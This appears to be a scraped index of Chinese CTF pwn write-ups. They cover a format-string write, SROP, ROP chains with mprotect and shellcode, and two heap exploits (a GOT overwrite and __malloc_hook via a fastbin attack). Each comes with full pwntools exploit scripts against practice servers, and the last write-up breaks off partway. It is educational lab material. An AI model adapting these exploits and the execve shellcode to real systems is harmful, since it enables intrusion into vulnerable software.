我们发现，如果我们想要运行system(\u0026quot;/bin/sh)就必须让x等于4。但是我们点进x看一下，发现它是一个等于3的全局变量（要是保存在.rodata节就寄了）：\n我们看一下程序代码，发现这么两行：\nread(0, buf, 0x50u); printf(buf); 直接打印我们输入的字符串，立马想到格式化字符串（所以绝对不能太过相信用户的输入……）\n构建exp 格式化字符串覆盖任意地址数据 这种方法基于：\nformat字符串会被保存在栈中 %n可以使用 我们首先要找到这个format字符串数据和esp的偏移，我们先输入一大串a，等到call printf的时候查看栈：\n我们看到栈顶前两个数据分别是format字符串和第1个参数，因此我们可以知道我们输入的字符串保存在第11个参数的位置，因此偏移就是11\n那么我们就可以构造我们的格式化字符串了：\n我们的目的是向我们输入的地址处写入数据4，而我们输入的地址是保存在第十一个参数的位置的，而且刚刚好32位的地址占用四个字节，所以：\npayload = pg(0x804a02c) + b\u0026#34;%11$n\u0026#34; 如果想把地址放在后面，因为\u0026quot;%11$n\u0026quot;占用5个字符，为了输入4我们需要在其前面填充4个字符，所以现在一共占用9个字符，我们可以通过填充3个垃圾数据让它占用达到12个字符，让我们的地址在第14个参数的位置：\npayload = b\u0026#34;aaaa%14$n!!!\u0026#34; + pg(0x804a02c) 我们也可以用pwntools提供的自动化工具：\n# 第一个参数是偏移量，也就是11 # 第二个参数是一个字典，key为需要更改的变量（函数）地址，val为需要更改的值 payload = fmtstr_payload(11, {0x804A02C: 0x4}) 完整exp from pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = False fn: str = \u0026#34;./fm\u0026#34; libc_name:str = \u0026#34;/lib/i386-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;break main\u0026#34;) else: p = process(fn,env={\u0026#34;LD_PRELOAD\u0026#34;:libc_name}) p.clean() payload = fmtstr_payload(11, {0x804A02C: 0x4}) p.sendline(payload) p.clean() p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9Ejarvisoj_fm/","section":"writeup","summary":"Never complain and never explain. — Benjamin Disraeli 原题链接 checksec查看程序架构 ida查看程序伪代码 构建exp 格式化字符串覆盖任意地址数据 完整exp checksec查看程序架构 $","tags":["pwn","格式化字符串漏洞"],"title":"【格式化字符串漏洞】jarvisoj_fmm"},{"categories":["writeup"],"contents":" Men in general judge more from appearances than from reality. All men have eyes, but few have the gift of penetration. — Niccolò Machiavelli\n原题链接\nchecksec查看程序架构 ida查看程序伪代码 构建exp 完整exp checksec查看程序架构 $ checksec --file ciscn_s_3 [*] \u0026#39;/home/peterl/security/workspace/ciscn_s_3/ciscn_s_3\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ida查看程序伪代码 这里有两个syscall用于读写，已经很明显地暗示要用syscall了\n接下来它又提供了一个gadget函数，明显是要为sig_return做好前置工作（设置RAX）\n那么我们的思路就很简单了，先调用sig_return，这样它就会把接下来我们安排在栈上的上下文作为接下来要恢复的上下文，这样我们就可以安排系统的寄存器了\n构建exp 首先第一次运行的时候会打印出来rbp的地址，为了让程序再运行一遍，我们将ret地址设置为vul函数的地址：\nstack_offset = -0x118 write_offset = 0x20 p.clean() p.send(b\u0026#34;a\u0026#34;*0x10 + pg(m_elf.sym[\u0026#39;vuln\u0026#39;])) p.recv(write_offset) bin_bash_addr = u64(p.recv(8)) + stack_offset 通过调试时的偏移计算，我们就获得了栈地址\n然后我们就可以通过pwntools的自动化工具构建sig_return后恢复的上下文了\nsig_ret_gadget = 0x4004DA syscall_ret = 0x400517 # 使用pwntools的自动化工具构建我们想要的上下文 frame = SigreturnFrame() frame.rax = constants.SYS_execve frame.rdi = bin_bash_addr frame.rsi = 0 frame.rdx = 0 frame.rip = syscall_ret success(str(frame)) 然后按sig_return+上下文的格式发过去就可以了：\np.send(b\u0026#34;/bin/sh\\x00\u0026#34;*0x2 + pg(sig_ret_gadget) + pg(syscall_ret) \\ + bytes(frame)) 完整exp from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./ciscn_s_3\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;28554\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;break main\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) stack_offset = -0x118 write_offset = 0x20 p.clean() p.send(b\u0026#34;a\u0026#34;*0x10 + pg(m_elf.sym[\u0026#39;vuln\u0026#39;])) p.recv(write_offset) bin_bash_addr = u64(p.recv(8)) + stack_offset p.clean() sig_ret_gadget = 0x4004DA syscall_ret = 0x400517 # 使用pwntools的自动化工具构建我们想要的上下文 frame = SigreturnFrame() frame.rax = constants.SYS_execve frame.rdi = bin_bash_addr frame.rsi = 0 frame.rdx = 0 frame.rip = syscall_ret success(str(frame)) p.send(b\u0026#34;/bin/sh\\x00\u0026#34;*0x2 + pg(sig_ret_gadget) + pg(syscall_ret) \\ + bytes(frame)) p.clean() p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E5%9F%BA%E7%A1%80sropsig_returnciscn_s_3/","section":"writeup","summary":"Men in general judge more from appearances than from reality. All men have eyes, but few have the gift of penetration. — Niccolò Machiavelli 原题链接 checksec查看程序架构 ida查看程序伪代码 构建exp 完整exp checkse","tags":["pwn","基础SROP","sig_return"],"title":"【基础SROP】【sig_return】ciscn_s_3"},{"categories":["writeup"],"contents":" You can\u0026rsquo;t choose up sides on a round world. — Wayne Dyer\n题目链接\n查看程序架构 不是动态链接程序\nida查看伪代码 解法一 该题没有system也没有/bin/sh，也不能ret2libc，也没有syscall，但是可以利用int 80h来原始地调用0xb号系统调用（execve） 因为长度限制为100，所以无法利用ropper或ROPgadget自动生成的ropchain（太长了），所以需要手写ropchain来添加利用率更高的gadget\n#!/usr/bin/python2 #coding=utf-8 from pwn import * from LibcSearcher import * context(os = \u0026#34;linux\u0026#34;, arch = \u0026#34;i386\u0026#34;, log_level= \u0026#34;debug\u0026#34;) p = remote(\u0026#34;node3.buuoj.cn\u0026#34;, 28443) read_addr = 0x0806cd50 int_80 = 0x080493e1 pop_eax_ret = 0x080bae06 pop_edx_ecx_eax_ret = 0x0806e850 bss_addr = 0x080eb584 payload = \u0026#34;a\u0026#34; * 0x20 + p32(read_addr) payload += p32(pop_edx_ecx_eax_ret)\t# 平衡栈空间 payload += p32(0) + p32(bss_addr) + p32(8)\t# read函数的三个参数 payload += p32(pop_eax_ret) + p32(0x0b)\t# 对eax进行赋值 # 对edx、ecx、ebx进行赋值 payload += p32(pop_edx_ecx_eax_ret) + p32(0) + p32(0) + p32(bss_addr) payload += p32(int_80) p.sendlineafter(\u0026#34;:\u0026#34;, payload) p.sendline(\u0026#34;/bin/sh\\x00\u0026#34;) p.sendline(\u0026#34;cat flag\u0026#34;) p.interactive() 解法二 调用mprotect函数设置一段内存的可执行权限，然后写入shellcode 需要注意的是mprotect参数中内存的起始地址需要是页大小的整数倍，也就是说末三位需要是0\n# 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = False fn: str = \u0026#34;./simplerop\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;25133\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x80EAF85 c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = False): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... offset: int = 0x18 + 8 pop_edx_ecx_ebx_ret = 0x0806e850 bss = 0x80EB000 ret = 0x080481b2 payload = flat({offset:[ m_elf.sym[\u0026#39;mprotect\u0026#39;], pop_edx_ecx_ebx_ret, bss, 0x1000, 0b111, m_elf.sym[\u0026#39;read\u0026#39;], pop_edx_ecx_ebx_ret, 0, bss, 0x100, bss ]}) sendline_after_clean(payload) # sleep(0.1) shellcode_32 = b\u0026#39;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\u0026#39; sendline_after_clean(flat(shellcode_32)) # sleep(0.1) # payload = flat({offset:bss}) # sendline_after_clean(payload) interactive_after_clean() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E5%88%A9%E7%94%A8int-80h%E5%88%A9%E7%94%A8mprotect%E5%87%BD%E6%95%B0buuctf-cmcc_simplerop/","section":"writeup","summary":"You can\u0026rsquo;t choose up sides on a round world. — Wayne Dyer 题目链接 查看程序架构 不是动态链接程序 ida查看伪代码 解法一 该题没有system也没有/bin/sh，也不能ret2libc，也","tags":["pwn","利用mprotect函数","利用int 80h"],"title":"【利用int 80h】【利用mprotect函数】BUUCTF cmcc_simplerop"},{"categories":["writeup"],"contents":" In times of change, learners inherit the earth, while the learned find themselves beautifully equipped to deal with a world that no longer exists. — Eric Hoffer\n原题链接\n查看程序架构 ida伪代码 可以看到是标准的菜单堆题\nallocate 这里自定义了结构体 在ends处按d新建域，光标在具体的域上按d会清空 这个函数就是一个结构体申请了两片内存：\n结构体固有的0x80字节的内存，第一个域是存放第二片内存的指针，第二个域用于存放一个name 第二片内存的大小是任意的，但是这里它限制ptr_content + input_size的值不能大于第一个域的内存地址 因为ptr_content的内存先申请，name的内存后申请，所以在没有free的情况下，ptr_content的内存地址总是小于name的并且紧密相连的，所以这个检测总是能够保证不溢出的 这里明显有一个漏洞，因为我们可以通过将两块内存free到unsorted bin中，再申请一块大小等于两块内存大小之和的内存作为ptr_content的地址，这样name申请的内存地址就会从top_chunk中切出，两者中间的一串chunk就都可以溢出了 remove 用不了UAF，也不能通过free到unsorted bin中获取libc\nshow 可以将ptr_content的值改为free的got值，然后就能获得free的地址了\nchange 只更新ptr_content里的值\nexp 通过溢出改变ptr_content的值为free_got，然后show出free的地址，计算得到system地址，改变free_got值为system地址即可\n# 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./babyfengshui_33c3_2016\u0026#34; libc_name: str = \u0026#34;/home/giantbranch/share/share_files/security/buuctf_libc/libc-2.23_32.so\u0026#34; port: str = \u0026#34;27439\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn, env=env) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... def allocate(size: int, name: bytes, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;0\u0026#34;) sendline_after_clean(str(size)) sendline_after_clean(name) sendline_after_clean(str(len(content))) sendline_after_clean(content) def remove(index: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;1\u0026#34;) sendline_after_clean(str(index)) def show(index: int) -\u0026gt; bytes: sendline_after_clean(b\u0026#34;2\u0026#34;) sendline_after_clean(str(index)) p.recvuntil(b\u0026#34;name: \u0026#34;) received = {} received[\u0026#39;name\u0026#39;] = p.recvline() p.recvuntil(b\u0026#34;description: \u0026#34;) received[\u0026#39;description\u0026#39;] = p.recv(4) print(received) return received def change(index: int, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;3\u0026#34;) sendline_after_clean(str(index)) sendline_after_clean(str(len(content))) sendline_after_clean(content) allocate(0x80, \u0026#34;1\u0026#34;, \u0026#34;0\u0026#34;) # 0 allocate(0x80, \u0026#34;/bin/sh\\x00\u0026#34;, \u0026#34;/bin/sh\\x00\u0026#34;)# 1 allocate(0x80, \u0026#34;/bin/sh\\x00\u0026#34;, \u0026#34;/bin/sh\\x00\u0026#34;)# 2 remove(0) # gdb.attach(p) # input() allocate(0x100, \u0026#34;/bin/sh\\x00\u0026#34;, \u0026#34;/bin/sh\\x00\u0026#34;)# 3 # allocate(0x80, \u0026#34;/bin/sh\\x00\u0026#34;, \u0026#34;/bin/sh\\x00\u0026#34;)# 4 # gdb.attach(p) payload = flat([ b\u0026#34;a\u0026#34;*0x108, 0, 0x89, b\u0026#34;a\u0026#34;*0x80, 0, 0x89, m_elf.got[\u0026#39;free\u0026#39;] ]) change(3, payload) # gdb.attach(p) free_addr = ug(show(1)[\u0026#39;description\u0026#39;].ljust(4, b\u0026#34;\\x00\u0026#34;)) libc_base = free_addr - libc.sym[\u0026#39;free\u0026#39;] system_addr = libc_base + libc.sym[\u0026#39;system\u0026#39;] suclog( free_addr=free_addr, libc_base=libc_base, system_addr=system_addr ) payload = flat(system_addr) change(1, payload) remove(2) interactive_after_clean() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E7%BB%95%E8%BF%87%E5%A0%86%E6%BA%A2%E5%87%BA%E9%99%90%E5%88%B6buuctf-babyfengshui_33c3_2016/","section":"writeup","summary":"In times of change, learners inherit the earth, while the learned find themselves beautifully equipped to deal with a world that no longer exists. — Eric Hoffer 原题链接 查看程序架构 ida伪代码 可以看到是标准的菜单堆题 allocate 这里自定义了结构体 在ends处按d新建","tags":["pwn","绕过堆溢出限制"],"title":"【绕过堆溢出限制】BUUCTF babyfengshui_33c3_2016"},{"categories":["writeup"],"contents":" It is only when the mind and character slumber that the dress can be seen. — Ralph Waldo Emerson\n原题链接\n这一题是作者的第一道堆题，给作者的第一感受就是神乎其神，在参考了网络上的一些 WP 后写下自己的 WP，如有错误烦请斧正\n参考文章 checksec 查看程序架构 ida 查看程序伪代码 allocate fill Free dump 基本思路 构建 exp 针对四个选项编写四个输入函数 得到初始 chunk 安排指向 chunk 4 的指针 将chunk 4放进unsorted bin中获取libc基址 覆写任意地址的数据 完整exp 参考文章 0ctf2017 babyheap 【PWN系列】 Buuctf babyheap_0ctf_2017 Writeup babyheap_0ctf_2017 堆技巧 ctfwiki 堆概述 checksec 查看程序架构 $ checksec --file babyheap_0ctf_2017 [*] \u0026#39;/home/peterl/security/workspace/babyheap_0ctf_2017/babyheap_0ctf_2017\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ida 查看程序伪代码 这个程序故意把.symtab节删掉了，所以没有函数名称，这里作者在 ida 中简单地重命名了一下\nallocate 这个函数会分配一个大小小于 4096 的内存块（不存在符号位漏洞），而我们知道这个内存块会是从 top_chunk 中分割出来的：\n然后，malloc 会返回指向 chunk 中size 的尾部，user_data 的首部，同时也是 fd 指针的首部的指针，而这个指针会存放在一个大数组中，而这个大数组是以三个单元为一个实体的，可以看作它是一个结构体数组，这个结构体数组的构造如下：\nfill 这个函数在检查内存是否可用（标志是否为 1）后会向对应索引的内存中填入任意大小的数据，这个数据长度是由用户随意指定的！！这里就出现了堆溢出漏洞\nFree 在检查标志位是否为 1 后，它会将标识位、size 置零，并释放内存\ndump 这个函数在检查标志位是否为 1 后，会将内存中的内容打印出来\n基本思路 我们想一下这么一件事：在我们的结构体数组中，理论上每一个结构体内的内存地址是不一样的，而且如果内存被释放，标志位也会被置零，从而也就无法访问。\n那么问题来了，如果我们让两个结构体内的指针都指向同一块内存，那么就算这块内存已被释放，我们仍然可以通过另一个指针访问这块已被释放的空间\n同时，我们知道三件事：\n当用户需要的 chunk 的大小小于 fastbin 的最大大小时， ptmalloc 会首先判断 fastbin 中相应的 bin 中是否有对应大小的空闲块，如果有的话，就会直接从这个 bin 中获取 chunk（默认最大大小为(64 * SIZE_SZ / 4)，32 位为 64=0x40 字节，64 位为 128=0x80 字节） 如果 unsorted bin 内有且仅有一块 chunk 时，这块 chunk 的 fd 指针和 bk 指针都会指向main_arena + 0x58 ，而且 main_arena 又相对 libc 固定偏移 0x3c4b20 如果malloc_hook存在，malloc会先调用__malloc_hook的值指向的函数 那么，假设我们能获得一个指向 unsorted bin 中唯一 chunk 的指针，我们就能成功获得 libc 基址。\n而如果我们拥有了一个指向 fast bin 中 chunk 的指针，那么我们就能够更改其 fd 指针，从而控制 malloc 到的地址的值，从而我们能够修改任何地址的内容\n然后，我们就可以更改__malloc_hook的值，从而更改malloc的行为\n构建 exp 针对四个选项编写四个输入函数 def allocate(size: int): p.clean() p.sendline(str(1)) p.clean() p.sendline(str(size)) def fill(index: int, payload: bytes): p.clean() p.sendline(str(2)) p.clean() p.sendline(str(index)) p.clean() p.sendline(str(len(payload))) p.clean() p.sendline(payload) def free(index: int): p.clean() p.sendline(str(3)) p.clean() p.sendline(str(index)) def dump(index: int) -\u0026gt; bytes: p.clean() p.sendline(str(4)) p.clean() p.sendline(str(index)) p.recvline() return p.recvuntil(\u0026#34;\\n\u0026#34;)[:-1] 得到初始 chunk 我们需要分配几个 chunk，其中有且仅有一个大小超过 fast bin 的限制，会被放进 unsorted bin 中\n然后我们会 allocate 两次，一次是正常的 fast bin 里面的内容，一次指向会被放入 unsorted bin 中的大 chunk。\n那么我们可以先划出 4 个 0x10 的 chunk（size 位=prev_size+size+prev_inuse+0x10=0x20），再划出一块 0x80 大小的 chunk 用以放进 unsorted bin 中：\n因此我们可以初始分配五个 chunk：\nallocate(0x10) allocate(0x10) allocate(0x10) allocate(0x10) allocate(0x80) 安排指向 chunk 4 的指针 我们只要覆写了 chunk 2 的 fd 指针，让它指向 chunk 4，那么我们在第二次 allocate 的时候，得到的就是指向 chunk 4 的指针\n具体步骤：\n这里我们先把 chunk 1 和 chunk 2 free 掉，这样子 chunk 1 和 chunk 2 的fd指针就生效了。\n又因为我们可以向一块chunk内填入任意大小的数据，我们就可以通过将payload1填进chunk0用以覆写chunk2的fd指针\n然后为了保证chunk4被正确分配，我们可以将payload2填入chunk3中，用以覆写chunk4的size\n这里要注意的是，chunk 4 的 size 位要设置成 0x21，不然在allocate(0x10)的时候，因为大小不一样，malloc 时是没有办法分配到 chunk 4 的\n然后我们就可以allocate两次，第二次分配到的就是chunk4了，这时chunk2指向的也是chunk4了。\n需要注意的是，我们需要将chunk 4 的size位恢复原状，因为我们下一步是要把chunk 4放入unsorted bin中\nfree(1) free(2) payload1 = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x21) + p8(0x80) fill(0, payload1) # 覆盖size位 payload2 = p64(0)*3 + p64(0x21) fill(3, payload2) allocate(0x10) # 得到chunk4指针 allocate(0x10) # 恢复size位 payload3 = p64(0)*3 + p64(0x91) fill(3, payload3) 将chunk 4放进unsorted bin中获取libc基址 我们不能直接把chunk 4 free掉，因为chunk 4和top chunk相邻，直接free掉会使chunk 4并入top chunk\n因此我们allocate一个chunk 5，然后free掉chunk 4，又因为此时chunk 4虽然由于标志位为0不可访问，但是chunk 2仍能被dump函数识别为未释放的空间，从而读取内容。\n因此，我们直接dump chunk 2，减去固定值0x3c4b78，就得到了libc基址\nallocate(0x80) free(4) libc_base = u64(dump(2)[:8].strip().ljust(8, b\u0026#34;\\x00\u0026#34;))-0x3c4b78 success(\u0026#34;libc_base: \u0026#34;+hex(libc_base)) 覆写任意地址的数据 当我们通过覆写chunk 2的fd位的时候，我们应该已经发现了，通过这种方式，我们可以将fd位覆写为任意我们喜欢的地址\n我们可以通过覆写code段中的__malloc_hook函数来改变malloc的行为，这个函数的详细说明见此，这里贴一段我们这个程序要用到的说明：\n可以看到，__malloc_hook函数的值是malloc会在它被call的时候使用的函数指针，所以，我们只需要更改__malloc_hook的值，我们就能更改malloc的行为\n__malloc_hook函数的偏移存在sym表中：\n$ readelf -aW libc-2.23.so | grep hook 00000000003c3dc8 000006fb00000006 R_X86_64_GLOB_DAT 00000000003c67b0 __malloc_initialize_hook@@GLIBC_2.2.5 + 0 00000000003c3ea8 000001e700000006 R_X86_64_GLOB_DAT 00000000003c9560 argp_program_version_hook@@GLIBC_2.2.5 + 0 00000000003c3eb0 